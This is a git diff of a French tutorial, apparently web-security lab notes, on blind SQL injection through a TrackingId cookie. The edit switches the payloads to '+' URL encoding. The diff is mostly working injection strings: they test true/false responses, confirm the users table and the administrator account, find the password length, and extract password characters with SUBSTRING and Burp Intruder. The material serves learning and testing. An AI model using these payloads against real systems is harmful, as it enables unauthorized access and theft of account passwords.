@@ -97,29 +97,28 @@ Précédemment nous avons trouver 2 colonnes de type chaîne de caractères, alo
 ### Déclencher des réponses conditionnelles
 
 ```
-Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1 --> toujours vrai donc le serveur renvoi une réponse
-Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2 --> pas vrai, donc le serveur ne renvoi rien
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'+AND+'1'='1 --> toujours vrai donc le serveur renvoi une réponse
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'+AND+'1'='2 --> pas vrai, donc le serveur ne renvoi rien
 ```
 
 ### Vérifier l'existence d'une table
 
 ```
-TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+LIMIT 1)='a
 ```
 
 ### Vérifier l'existence d'un compte utilisateur
 
 ```
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a
 ```
 
 ### Déterminer la longueur du mot de passe 
 
 ```
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>4)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>2)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>3)='a
 etc.
 ```
 
@@ -128,10 +127,10 @@ etc.
 1) Transmettre cette requête dans Burp intruder, et marquer la position du payload sur "1" et "a" : 
 
 ```
-TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='§a§
 ```
 
-2) Utiliser une "attack type - cluster bomb"
+2) Utiliser une "attack type - cluster bomb".
 
 3) Puis 2 payloads : 
 
